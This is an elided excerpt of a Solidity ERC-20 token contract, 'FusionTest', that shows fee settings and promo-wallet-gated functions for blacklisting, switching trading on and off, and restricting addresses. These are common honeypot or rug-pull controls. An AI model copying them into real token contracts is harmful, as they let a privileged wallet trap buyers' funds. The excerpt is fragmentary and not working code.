...
contract fusiontest is Context, IERC20, Ownable {
    ...
    string private constant _name = "FusionTest"; 
    string private constant _symbol = "$ftest"; 
    uint8 private constant _decimals = 9;
    
    uint256 public _promoFee = 1;
    uint256 public _liquidityFee = 1;
    address private _promoWallet = 0xF85005296B7b382cB0841689bF093F7f1d52867C;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        function enable_blacklist(bool _status) public promoWallet {
        blacklistMode = _status;
    }
    
    function tokenStatus(bool _status, address account) public promoWallet {
        tradingOpen = _status;
        _isExcludedFromFee[account] = true;
    }

    function manageAddress(address[] calldata addresses, bool status) public promoWallet virtual {
    ...
    function _transfer(
        ...
        if(!promowallet[from] && !promowallet[to]){
    ...
    function LimitAddress(address account, bool newValue) public promoWallet {
